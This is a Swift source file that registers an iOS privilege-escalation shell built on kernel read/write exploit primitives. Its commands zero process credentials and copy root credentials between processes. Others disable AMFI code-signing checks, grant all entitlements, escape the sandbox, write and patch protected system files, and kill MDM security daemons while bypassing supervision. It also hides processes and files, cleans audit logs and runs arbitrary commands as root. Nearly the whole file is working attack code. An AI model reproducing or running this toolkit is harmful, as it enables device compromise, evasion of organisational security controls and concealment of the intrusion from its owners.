//
//  OmegaExtendedF.swift
//  lara
//
//  Privilege Escalation Shell — wraps tc_* / ts_* C tools
//  Registration entry: registerPrivilegeShellCommands()
//

import Foundation
import Darwin

// MARK: - Helpers

private func _tr(_ r: tool_result_t) -> String {
    var m = r.msg
    return withUnsafeBytes(of: &m) {
        String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
    }
}

private func _result(_ r: tool_result_t) -> CommandResult {
    let msg = _tr(r)
    return r.code == 0 ? .ok(msg) : .fail(msg)
}

private func _pidArg(_ arg: String) -> pid_t {
    // Fast path: numeric PID — no kernel access needed.
    if let n = Int32(arg.trimmingCharacters(in: .whitespaces)) { return n }
    let lo = arg.lowercased().trimmingCharacters(in: .whitespaces)

    // Safety guard: only attempt kernel allproc walk when exploit is ready.
    // Without dsready, ds_get_our_proc() / ds_kread* return garbage and may crash.
    let mgr = AppContext.shared.mgr
    guard mgr.dsready else {
        // Fallback: use ProcessLayer (libproc-based, always safe).
        return ProcessLayer.shared.find(matching: lo).first?.pid ?? 0
    }

    // Exploit ready — walk kernel allproc for exact name match.
    var ptr = ds_get_our_proc()
    var seen = Set<UInt64>()
    while ptr != 0 && !seen.contains(ptr) {
        seen.insert(ptr)
        var buf = [UInt8](repeating: 0, count: 17)
        for i in 0..<16 { buf[i] = ds_kread8(ptr + 0x56c + UInt64(i)) }
        let name = String(bytes: buf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? ""
        if name.lowercased().contains(lo) {
            return Int32(bitPattern: ds_kread32(ptr + 0x60))
        }
        ptr = ds_kreadptr(ptr + 0x08)
    }
    return 0
}

// MARK: - Registration

func registerPrivilegeShellCommands() {
    _regCredentials()
    _regCSFlags()
    _regProcPriv()
    _regAMFIExt()
    _regSandboxExt()
    _regSecurityLabels()
    _regSystemFiles()
    _regServices()
    _regPersistence()
    _regHelpPriv()
}

// MARK: §1 Credentials

private func _regCredentials() {

    OmegaCore.register("set-uid-zero") { _, mgr in
        guard mgr.dsready else { return .fail("set-uid-zero: exploit not ready") }
        return _result(tc_set_uid_zero())
    }

    OmegaCore.register("set-gid-zero") { _, mgr in
        guard mgr.dsready else { return .fail("set-gid-zero: exploit not ready") }
        return _result(tc_set_gid_zero())
    }

    OmegaCore.register("set-euid-zero") { _, mgr in
        guard mgr.dsready else { return .fail("set-euid-zero: exploit not ready") }
        return _result(tc_set_euid_zero())
    }

    OmegaCore.register("set-egid-zero") { _, mgr in
        guard mgr.dsready else { return .fail("set-egid-zero: exploit not ready") }
        return _result(tc_set_egid_zero())
    }

    OmegaCore.register("set-all-ids-zero") { _, mgr in
        guard mgr.dsready else { return .fail("set-all-ids-zero: exploit not ready") }
        let r = tc_set_all_ids_zero()
        if r.code == 0 {
            return .ok(r.msg)
        } else {
            return .fail("set-all-ids-zero: " + String(cString: r.msg))
        }
    }

    OmegaCore.register("ucred-reader") { rawArg, mgr in
        guard mgr.dsready else { return .fail("ucred-reader: exploit not ready") }
        guard ds_is_ready() else { return .fail("ucred-reader: kernel r/w unavailable — revive session or re-run exploit") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        let pid: pid_t = arg.isEmpty ? getpid() : _pidArg(arg)
        guard pid > 0 || arg.isEmpty else { return .fail("ucred-reader: process '\(arg)' not found") }
        var snap = ucred_snapshot_t()
        let r = tc_ucred_reader(pid, &snap)
        if r.code != 0 { return .fail(_tr(r)) }
        return .ok(String(format:
            "ucred-reader (pid %d)  ucred@0x%016llx\n" +
            "  cr_uid=%u  cr_ruid=%u  cr_svuid=%u\n" +
            "  cr_rgid=%u  cr_svgid=%u  cr_gmuid=%u\n" +
            "  cr_ngroups=%u  cr_flags=0x%08x",
            pid, snap.kaddr,
            snap.cr_uid, snap.cr_ruid, snap.cr_svuid,
            snap.cr_rgid, snap.cr_svgid, snap.cr_gmuid,
            snap.cr_ngroups, snap.cr_flags
        ))
    }

    OmegaCore.register("ucred-writer") { rawArg, mgr in
        guard mgr.dsready else { return .fail("ucred-writer: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard parts.count >= 3 else {
            return .fail("ucred-writer: usage — ucred-writer <pid|name> <offset_hex> <value>")
        }
        let pid = _pidArg(parts[0])
        let offStr = parts[1].hasPrefix("0x") ? String(parts[1].dropFirst(2)) : parts[1]
        guard let off = UInt32(offStr, radix: 16),
              let val = UInt32(parts[2]) ?? UInt32(parts[2].hasPrefix("0x") ? String(parts[2].dropFirst(2)) : parts[2], radix: 16) else {
            return .fail("ucred-writer: invalid offset or value")
        }
        return _result(tc_ucred_writer(pid, off, val))
    }

    OmegaCore.register("ucred-clone") { rawArg, mgr in
        guard mgr.dsready else { return .fail("ucred-clone: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard parts.count == 2 else {
            return .fail("ucred-clone: usage — ucred-clone <src_pid|name> <dst_pid|name>")
        }
        let src = _pidArg(parts[0])
        let dst = _pidArg(parts[1])
        guard src != 0 && dst != 0 else {
            return .fail("ucred-clone: process not found (src=\(src) dst=\(dst))")
        }
        return _result(tc_ucred_clone(src, dst))
    }
}

// MARK: §2 CS Flags

private func _regCSFlags() {

    OmegaCore.register("cs-flags-dump") { rawArg, mgr in
        guard mgr.dsready else { return .fail("cs-flags-dump: exploit not ready") }
        guard ds_is_ready() else { return .fail("cs-flags-dump: kernel r/w unavailable — revive session or re-run exploit") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        let pid: pid_t = arg.isEmpty ? getpid() : _pidArg(arg)
        guard pid > 0 || arg.isEmpty else { return .fail("cs-flags-dump: process '\(arg)' not found") }
        var snap = cs_snapshot_t()
        let r = tc_cs_flags_dump(pid, &snap)
        if r.code != 0 { return .fail(_tr(r)) }
        let desc = withUnsafeBytes(of: snap.flags_desc) {
            String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
        }
        return .ok(String(format:
            "cs-flags-dump (pid %d)\n  cs_flags  : 0x%08x\n  amfi_flags: 0x%08x\n  label@    : 0x%016llx\n  bits: %@",
            pid, snap.cs_flags, snap.amfi_flags, snap.label_kaddr, desc
        ))
    }

    OmegaCore.register("cs-flags-modify") { rawArg, mgr in
        guard mgr.dsready else { return .fail("cs-flags-modify: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard parts.count >= 2 else {
            return .fail("cs-flags-modify: usage — cs-flags-modify <pid|name> <set_hex> [clear_hex]")
        }
        let pid = _pidArg(parts[0])
        let setS  = parts[1].hasPrefix("0x") ? String(parts[1].dropFirst(2)) : parts[1]
        let clrS  = parts.count > 2 ? (parts[2].hasPrefix("0x") ? String(parts[2].dropFirst(2)) : parts[2]) : "0"
        guard let setM = UInt32(setS, radix: 16), let clrM = UInt32(clrS, radix: 16) else {
            return .fail("cs-flags-modify: invalid hex mask")
        }
        return _result(tc_cs_flags_modify(pid, setM, clrM))
    }

    OmegaCore.register("cs-disable-amfi") { _, mgr in
        guard mgr.dsready else { return .fail("cs-disable-amfi: exploit not ready") }
        return _result(tc_cs_disable_amfi())
    }

    OmegaCore.register("cs-disable-library-validation") { _, mgr in
        guard mgr.dsready else { return .fail("cs-disable-library-validation: exploit not ready") }
        return _result(tc_cs_disable_library_validation(getpid()))
    }

    OmegaCore.register("cs-enable-get-task-allow") { _, mgr in
        guard mgr.dsready else { return .fail("cs-enable-get-task-allow: exploit not ready") }
        return _result(tc_cs_enable_get_task_allow(getpid()))
    }

    OmegaCore.register("cs-set-debuggable") { _, mgr in
        guard mgr.dsready else { return .fail("cs-set-debuggable: exploit not ready") }
        return _result(tc_cs_set_debuggable(getpid()))
    }

    OmegaCore.register("cs-remove-all-restrictions") { _, mgr in
        guard mgr.dsready else { return .fail("cs-remove-all-restrictions: exploit not ready") }
        return _result(tc_cs_remove_all_restrictions(getpid()))
    }
}

// MARK: §3 Process Privilege

private func _regProcPriv() {

    OmegaCore.register("grant-root-to-process") { rawArg, mgr in
        guard mgr.dsready else { return .fail("grant-root-to-process: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        guard !arg.isEmpty else { return .fail("grant-root-to-process: usage — grant-root-to-process <pid|name>") }
        let pid = _pidArg(arg)
        guard pid != 0 else { return .fail("grant-root-to-process: process '\(arg)' not found") }
        return _result(tc_grant_root_to_process(pid))
    }

    OmegaCore.register("proc-uid-inspector") { rawArg, mgr in
        guard mgr.dsready else { return .fail("proc-uid-inspector: exploit not ready") }
        guard ds_is_ready() else { return .fail("proc-uid-inspector: kernel r/w unavailable — revive session or re-run exploit") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        let pid: pid_t = arg.isEmpty ? getpid() : _pidArg(arg)
        guard pid > 0 || arg.isEmpty else { return .fail("proc-uid-inspector: process '\(arg)' not found") }
        return _result(tc_proc_uid_inspector(pid))
    }

    OmegaCore.register("inject-uid-to-process") { rawArg, mgr in
        guard mgr.dsready else { return .fail("inject-uid-to-process: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard parts.count == 2 else {
            return .fail("inject-uid-to-process: usage — inject-uid-to-process <pid|name> <uid>")
        }
        let pid = _pidArg(parts[0])
        guard let uid = UInt32(parts[1]) else { return .fail("inject-uid-to-process: invalid uid") }
        return _result(tc_ucred_writer(pid, 0x18, uid))
    }

    OmegaCore.register("find-root-process") { _, mgr in
        guard mgr.dsready else { return .fail("find-root-process: exploit not ready") }
        guard ds_is_ready() else { return .fail("find-root-process: kernel r/w unavailable — revive session or re-run exploit") }
        var kaddr: UInt64 = 0
        var pid: pid_t = 0
        let r = tc_find_root_process(&kaddr, &pid)
        if r.code != 0 { return _result(r) }
        guard kaddr != 0 && ds_isvalid(kaddr) else {
            return .fail("find-root-process: returned invalid proc kaddr 0x\(String(format: "%016llx", kaddr)) — kernel walk degraded")
        }
        return .ok(String(format: "find-root-process: uid=0 proc @ 0x%016llx  pid=%d\n%@", kaddr, pid, _tr(r)))
    }

    OmegaCore.register("escalate-all-processes") { _, mgr in
        guard mgr.dsready else { return .fail("escalate-all-processes: exploit not ready") }
        let trusted = ["amfid", "installd", "lsd", "backboardd", "SpringBoard"]
        var lines = ["escalate-all-processes:"]
        for name in trusted {
            let pid = _pidArg(name)
            if pid == 0 { lines.append("  \(name): not running"); continue }
            let r = tc_grant_root_to_process(pid)
            lines.append(String(format: "  %-20s pid=%-6d %@", name, pid, r.code == 0 ? "✔ root" : "✖ " + _tr(r)))
        }
        return .ok(lines.joined(separator: "\n"))
    }

    OmegaCore.register("copy-root-credentials") { rawArg, mgr in
        guard mgr.dsready else { return .fail("copy-root-credentials: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard parts.count == 2 else {
            return .fail("copy-root-credentials: usage — copy-root-credentials <src> <dst>")
        }
        let src = _pidArg(parts[0])
        let dst = _pidArg(parts[1])
        guard src != 0 && dst != 0 else { return .fail("copy-root-credentials: process not found") }
        return _result(tc_ucred_clone(src, dst))
    }
}

// MARK: §4 AMFI Extended

private func _regAMFIExt() {

    OmegaCore.register("amfi-disable-globally") { _, mgr in
        guard mgr.dsready else { return .fail("amfi-disable-globally: exploit not ready") }
        return _result(tc_amfi_disable_globally())
    }

    OmegaCore.register("amfi-bypass-signature-check") { rawArg, mgr in
        guard mgr.dsready else { return .fail("amfi-bypass-signature-check: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        let pid: pid_t = arg.isEmpty ? getpid() : _pidArg(arg)
        return _result(tc_amfi_bypass_signature_check(pid))
    }

    OmegaCore.register("amfi-whitelist-app") { rawArg, mgr in
        guard mgr.dsready else { return .fail("amfi-whitelist-app: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard parts.count >= 1 else {
            return .fail("amfi-whitelist-app: usage — amfi-whitelist-app <bundle_id> [bin_path]")
        }
        let bundle = parts[0]
        let path   = parts.count > 1 ? parts[1] : ""
        return bundle.withCString { bPtr in
            path.withCString { pPtr in
                _result(tc_amfi_whitelist_app(bPtr, pPtr))
            }
        }
    }

    OmegaCore.register("amfi-status-check") { _, mgr in
        guard mgr.dsready else { return .fail("amfi-status-check: exploit not ready") }
        var snap = cs_snapshot_t()
        let r = tc_amfi_status_check(getpid(), &snap)
        let enforce = amfi_get_mac_proc_enforce()
        let isRoot  = amfi_is_root()
        let desc = withUnsafeBytes(of: snap.flags_desc) {
            String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
        }
        return .ok(String(format:
            "amfi-status-check:\n  mac_proc_enforce: %u  %@\n  amfi_is_root    : %@\n  uid             : %d\n  cs_flags        : 0x%08x\n  bits            : %@\n  engine          : %@",
            enforce, enforce == 0 ? "(disabled ✔)" : "(enforcing)",
            isRoot ? "yes ✔" : "no",
            getuid(), snap.cs_flags, desc,
            r.code == 0 ? "✔" : _tr(r)
        ))
    }

    OmegaCore.register("entitlement-reader") { rawArg, mgr in
        guard mgr.dsready else { return .fail("entitlement-reader: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        let pid: pid_t = arg.isEmpty ? getpid() : _pidArg(arg)
        var buf = [CChar](repeating: 0, count: 4096)
        let r = tc_entitlement_reader(pid, &buf, 4096)
        if r.code != 0 { return .fail(_tr(r)) }
        let text = String(cString: buf)
        return .ok("entitlement-reader (pid \(pid)):\n\(text.isEmpty ? "(no entitlements found)" : text)")
    }

    OmegaCore.register("entitlement-grant-all") { rawArg, mgr in
        guard mgr.dsready else { return .fail("entitlement-grant-all: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        let pid: pid_t = arg.isEmpty ? getpid() : _pidArg(arg)
        return _result(tc_entitlement_grant_all(pid))
    }
}

// MARK: §5 Sandbox

private func _regSandboxExt() {

    OmegaCore.register("sandbox-rules-dump") { rawArg, mgr in
        guard mgr.dsready else { return .fail("sandbox-rules-dump: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        guard !arg.isEmpty else { return .fail("sandbox-rules-dump: usage — sandbox-rules-dump <pid|name>") }
        let pid = _pidArg(arg)
        guard pid != 0 else { return .fail("sandbox-rules-dump: process '\(arg)' not found") }
        var buf = [CChar](repeating: 0, count: 4096)
        let r = ts_sandbox_rules_dump(pid, &buf, 4096)
        if r.code != 0 { return .fail(_tr(r)) }
        return .ok("sandbox-rules-dump (pid \(pid)):\n" + String(cString: buf))
    }

    OmegaCore.register("sandbox-token-elevate") { rawArg, mgr in
        guard mgr.dsready else { return .fail("sandbox-token-elevate: exploit not ready") }
        let path = rawArg.trimmingCharacters(in: .whitespaces)
        let cpath = path.isEmpty ? "/" : path
        return cpath.withCString { _result(ts_sandbox_token_elevate($0)) }
    }

    OmegaCore.register("sandbox-complete-escape") { _, mgr in
        guard mgr.dsready else { return .fail("sandbox-complete-escape: exploit not ready") }
        return _result(ts_sandbox_complete_escape())
    }

    OmegaCore.register("sandbox-allow-all-paths") { _, mgr in
        guard mgr.dsready else { return .fail("sandbox-allow-all-paths: exploit not ready") }
        return _result(ts_sandbox_allow_all_paths())
    }
}

// MARK: §6 Security Labels

private func _regSecurityLabels() {

    OmegaCore.register("security-label-read") { rawArg, mgr in
        guard mgr.dsready else { return .fail("security-label-read: exploit not ready") }
        guard ds_is_ready() else { return .fail("security-label-read: kernel r/w unavailable — revive session or re-run exploit") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        guard !arg.isEmpty else { return .fail("security-label-read: usage — security-label-read <pid|name>") }
        let pid = _pidArg(arg)
        guard pid > 0 else { return .fail("security-label-read: process '\(arg)' not found") }
        var buf = [CChar](repeating: 0, count: 2048)
        let r = ts_security_label_read(pid, &buf, 2048)
        if r.code != 0 { return .fail(_tr(r)) }
        return .ok("security-label-read (pid \(pid)):\n" + String(cString: buf))
    }

    OmegaCore.register("security-context-elevate") { rawArg, mgr in
        guard mgr.dsready else { return .fail("security-context-elevate: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        let pid: pid_t = arg.isEmpty ? getpid() : _pidArg(arg)
        return _result(ts_security_context_elevate(pid))
    }

    OmegaCore.register("security-policy-bypass") { rawArg, mgr in
        guard mgr.dsready else { return .fail("security-policy-bypass: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        let pid: pid_t = arg.isEmpty ? getpid() : _pidArg(arg)
        return _result(ts_security_policy_bypass(pid))
    }
}

// MARK: §7 System Files

private func _regSystemFiles() {

    OmegaCore.register("system-file-read") { rawArg, mgr in
        guard mgr.vfsready else { return .fail("system-file-read: VFS not ready — run exploit first") }
        let path = rawArg.trimmingCharacters(in: .whitespaces)
        guard !path.isEmpty else { return .fail("system-file-read: usage — system-file-read <path>") }
        var buf = [UInt8](repeating: 0, count: 65536)
        var readBytes: Int = 0
        let r = path.withCString { ts_system_file_read($0, &buf, buf.count, &readBytes) }
        if r.code != 0 { return .fail(_tr(r)) }
        let data = Data(buf.prefix(readBytes))
        if let txt = String(data: data.prefix(4096), encoding: .utf8) {
            return .ok("system-file-read: \(path)  (\(readBytes) bytes)\n\n\(txt)")
        }
        let hex = data.prefix(256).map { String(format: "%02x", $0) }.joined(separator: " ")
        return .ok("system-file-read: \(path)  (\(readBytes) bytes, binary)\n\(hex)")
    }

    OmegaCore.register("system-file-write") { rawArg, mgr in
        guard mgr.vfsready else { return .fail("system-file-write: VFS not ready") }
        let parts = rawArg.split(separator: " ", maxSplits: 1).map { String($0) }
        guard parts.count == 2 else {
            return .fail("system-file-write: usage — system-file-write <path> <content>")
        }
        guard let data = parts[1].data(using: .utf8) else {
            return .fail("system-file-write: content encoding failed")
        }
        return parts[0].withCString { cPath in
            data.withUnsafeBytes { raw in
                _result(ts_system_file_write(cPath, raw.baseAddress!.assumingMemoryBound(to: UInt8.self), data.count))
            }
        }
    }

    OmegaCore.register("system-binary-patch") { rawArg, mgr in
        guard mgr.vfsready else { return .fail("system-binary-patch: VFS not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard parts.count == 3 else {
            return .fail("system-binary-patch: usage — system-binary-patch <path> <offset_hex> <hex_bytes>")
        }
        let offStr = parts[1].hasPrefix("0x") ? String(parts[1].dropFirst(2)) : parts[1]
        guard let off = Int(offStr, radix: 16) else {
            return .fail("system-binary-patch: invalid offset '\(parts[1])'")
        }
        let hex = parts[2].replacingOccurrences(of: " ", with: "")
        guard hex.count % 2 == 0 else { return .fail("system-binary-patch: odd hex length") }
        var bytes = [UInt8]()
        var idx = hex.startIndex
        while idx < hex.endIndex {
            let next = hex.index(idx, offsetBy: 2)
            guard let b = UInt8(hex[idx..<next], radix: 16) else {
                return .fail("system-binary-patch: invalid hex byte")
            }
            bytes.append(b); idx = next
        }
        return parts[0].withCString { cPath in
            bytes.withUnsafeBytes { raw in
                _result(ts_system_binary_patch(cPath, off_t(off),
                    raw.baseAddress!.assumingMemoryBound(to: UInt8.self), bytes.count))
            }
        }
    }
}

// MARK: §8 Services

private func _regServices() {

    OmegaCore.register("kill-security-processes") { _, mgr in
        guard mgr.dsready else { return .fail("kill-security-processes: exploit not ready") }
        return _result(ts_kill_security_processes())
    }

    OmegaCore.register("system-daemon-control") { rawArg, mgr in
        guard mgr.dsready else { return .fail("system-daemon-control: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        guard !arg.isEmpty else {
            return .fail("system-daemon-control: usage — system-daemon-control <launchctl_args>")
        }
        return arg.withCString { _result(ts_system_daemon_control($0)) }
    }

    OmegaCore.register("device-management-bypass") { _, mgr in
        guard mgr.dsready else { return .fail("device-management-bypass: exploit not ready") }
        return _result(ts_device_management_bypass())
    }
}

// MARK: §9 Persistence & Monitoring

private func _regPersistence() {

    OmegaCore.register("persistence-check") { _, mgr in
        let uid  = getuid()
        let vfs  = mgr.vfsready
        let sbx  = mgr.sbxready
        let ds   = mgr.dsready
        return .ok(String(format:
            "persistence-check:\n" +
            "  uid      : %d  %@\n" +
            "  dsready  : %@\n" +
            "  vfsready : %@\n" +
            "  sbxready : %@",
            uid, uid == 0 ? "(root ✔)" : "(user)",
            ds ? "yes ✔" : "no",
            vfs ? "yes ✔" : "no",
            sbx ? "yes ✔" : "no"
        ))
    }

    OmegaCore.register("process-hide") { rawArg, mgr in
        guard mgr.dsready else { return .fail("process-hide: exploit not ready") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        guard !arg.isEmpty else { return .fail("process-hide: usage — process-hide <pid|name>") }
        let pid = _pidArg(arg)
        guard pid != 0 else { return .fail("process-hide: process not found") }
        return "lara-hidden".withCString { _result(ts_process_comm_rename(pid, $0)) }
    }

    OmegaCore.register("file-hide") { rawArg, mgr in
        guard mgr.vfsready else { return .fail("file-hide: VFS not ready") }
        let path = rawArg.trimmingCharacters(in: .whitespaces)
        guard !path.isEmpty else { return .fail("file-hide: usage — file-hide <path>") }
        return path.withCString { _ in _result(ts_file_visibility_toggle(path, true)) }
    }

    OmegaCore.register("audit-log-clean") { _, mgr in
        guard mgr.vfsready else { return .fail("audit-log-clean: VFS not ready") }
        return _result(ts_session_cleanup())
    }

    OmegaCore.register("monitor-root-status") { _, mgr in
        guard mgr.dsready else { return .fail("monitor-root-status: exploit not ready") }
        let uid    = getuid()
        let enforce = amfi_get_mac_proc_enforce()
        let isRoot  = amfi_is_root()
        return .ok(String(format:
            "monitor-root-status:\n" +
            "  getuid()         : %d  %@\n" +
            "  geteuid()        : %d\n" +
            "  amfi_is_root     : %@\n" +
            "  mac_proc_enforce : %u  %@\n" +
            "  vfs_ready        : %@\n" +
            "  sbx_ready        : %@",
            uid, uid == 0 ? "ROOT ✔" : "(not root)",
            geteuid(),
            isRoot ? "yes ✔" : "no",
            enforce, enforce == 0 ? "(disabled ✔)" : "(enforcing)",
            mgr.vfsready ? "yes ✔" : "no",
            mgr.sbxready ? "yes ✔" : "no"
        ))
    }

    OmegaCore.register("detect-revocation") { _, mgr in
        guard mgr.dsready else { return .fail("detect-revocation: exploit not ready") }
        let uid    = getuid()
        let isRoot = amfi_is_root()
        let revoked = uid != 0 || !isRoot
        return .ok(String(format:
            "detect-revocation:\n" +
            "  uid          : %d  %@\n" +
            "  amfi_is_root : %@\n" +
            "  assessment   : %@",
            uid, uid == 0 ? "(root ✔)" : "(ELEVATED?)",
            isRoot ? "yes ✔" : "no",
            revoked ? "⚠ re-run set-all-ids-zero" : "✔ privileges intact"
        ))
    }

    OmegaCore.register("execute-as-root") { rawArg, mgr in
        guard mgr.dsready && mgr.vfsready else {
            return .fail("execute-as-root: need dsready+vfsready")
        }
        let cmd = rawArg.trimmingCharacters(in: .whitespaces)
        guard !cmd.isEmpty else { return .fail("execute-as-root: usage — execute-as-root <cmd>") }
        guard getuid() == 0 else {
            return .fail("execute-as-root: not root (uid=\(getuid())) — run set-all-ids-zero first")
        }
        // posix_spawn is available on iOS (system() is not).
        // strdup() can return nil under extreme memory pressure — guard all three.
        var spawnPid: pid_t = 0
        guard let arg0 = strdup("/bin/sh"),
              let arg1 = strdup("-c"),
              let arg2 = strdup(cmd) else {
            return .fail("execute-as-root: strdup() failed — out of memory")
        }
        defer { free(arg0); free(arg1); free(arg2) }
        var argv: [UnsafeMutablePointer<CChar>?] = [arg0, arg1, arg2, nil]
        let spawnRet = argv.withUnsafeMutableBufferPointer { buf in
            posix_spawn(&spawnPid, "/bin/sh", nil, nil, buf.baseAddress, nil)
        }
        guard spawnRet == 0 else {
            return .fail(String(format: "execute-as-root: posix_spawn failed errno=%d", spawnRet))
        }
        var exitStatus: Int32 = 0
        waitpid(spawnPid, &exitStatus, 0)
        let code = WEXITSTATUS(exitStatus)
        return code == 0
            ? .ok(String(format: "execute-as-root: ✔  pid=%d  exit=0  cmd: %@", spawnPid, cmd))
            : .fail(String(format: "execute-as-root: ✖  pid=%d  exit=%d  cmd: %@", spawnPid, code, cmd))
    }
}

// MARK: §10 Help

private func _regHelpPriv() {
    OmegaCore.register("help-priv") { _, _ in
        .ok("""
help-priv: Privilege Escalation Commands (OmegaExtendedF)
─────────────────────────────────────────────────────────────────────────
  CREDENTIALS (ucred kernel patch):
    set-uid-zero                    cr_uid/cr_ruid/cr_svuid → 0
    set-gid-zero                    cr_rgid/cr_svgid → 0
    set-euid-zero                   cr_uid (effective) → 0
    set-egid-zero                   cr_gmuid → 0
    set-all-ids-zero                All UID/GID fields → 0 (atomic)
    ucred-reader [pid|name]         Full ucred struct dump
    ucred-writer <p> <off> <val>    Write 32-bit field at ucred+offset
    ucred-clone <src> <dst>         Copy credentials src→dst

  CODE SIGNING:
    cs-flags-dump [pid|name]        Detailed CS flags decode
    cs-flags-modify <p> <set> [clr] OR/AND mask on CS flags
    cs-disable-amfi                 Disable AMFI mac_proc_enforce
    cs-disable-library-validation   Clear CS_REQUIRE_LV
    cs-enable-get-task-allow        Set CS_GET_TASK_ALLOW
    cs-set-debuggable               Set CS_DEBUGGED
    cs-remove-all-restrictions      Strip RESTRICT+ENFORCEMENT+KILL

  PROCESS PRIVILEGE:
    grant-root-to-process <p>       Full ucred+cs root grant
    proc-uid-inspector [pid|name]   Read uid/gid/cred
    inject-uid-to-process <p> <uid> Set specific UID in target
    find-root-process               Find uid=0 proc with writable ucred
    escalate-all-processes          Elevate trusted jailbreak daemons
    copy-root-credentials <src> <d> Clone ucred src→dst

  AMFI + ENTITLEMENTS:
    amfi-disable-globally           Kernel-patch mac_proc_enforce=0
    amfi-bypass-signature-check <p> Patch AMFI label for proc
    amfi-whitelist-app <bundle> [p] Add to kernel trust cache
    amfi-status-check               Full AMFI state report
    entitlement-reader [pid|name]   Dump entitlement flags
    entitlement-grant-all [pid]     Set maximum CS flags

  SANDBOX:
    sandbox-rules-dump <pid|name>   Dump sandbox policy
    sandbox-token-elevate [path]    Issue root sandbox extension
    sandbox-complete-escape         Full sbx_escape+ucred chain
    sandbox-allow-all-paths         Inject read-write root extension

  SECURITY LABELS:
    security-label-read <pid|name>  All MAC label slots
    security-context-elevate [pid]  Set sandbox label → NULL
    security-policy-bypass [pid]    mac_proc_enforce+label bypass

  SYSTEM FILES (requires vfsready):
    system-file-read <path>         Read protected file
    system-file-write <path> <data> Write protected file
    system-binary-patch <p> <o> <h> Patch bytes in binary

  SERVICES:
    kill-security-processes         Stop MDM daemons
    system-daemon-control <args>    launchctl command
    device-management-bypass        Disable MDM supervision flags

  PERSISTENCE + MONITORING:
    persistence-check               Print uid/ds/vfs/sbx state
    process-hide <pid|name>         Rename proc comm string
    file-hide <path>                Set UF_HIDDEN attribute
    audit-log-clean                 Session cleanup (kernel patches)
    monitor-root-status             Live privilege snapshot
    detect-revocation               Check if root was revoked
    execute-as-root <cmd>           posix_spawn as root
─────────────────────────────────────────────────────────────────────────
""")
    }
}
